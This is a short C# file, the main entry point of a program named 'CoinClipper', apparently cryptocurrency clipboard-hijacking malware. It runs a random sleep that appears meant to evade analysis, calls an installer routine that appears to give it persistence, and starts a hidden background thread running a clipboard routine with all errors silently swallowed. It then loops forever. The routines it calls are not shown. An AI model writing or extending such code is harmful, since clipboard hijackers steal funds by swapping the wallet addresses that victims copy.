using System;
using System.Threading;

namespace CoinClipper
{
    internal class Program
    {
        static void Main(string[] args)
        {
           
            Snoozy.SleepRandomly();

      
            Copy.Install();

           
            Thread clipboardThread = new Thread(() =>
            {
                try
                {
                    Clip.Run();
                }
                catch (Exception)
                {
                    
                }
            });
            clipboardThread.SetApartmentState(ApartmentState.STA);
            clipboardThread.IsBackground = true;
            clipboardThread.Start();

   
            while (true)
            {
                Thread.Sleep(10000);
            }
        }
    }
}
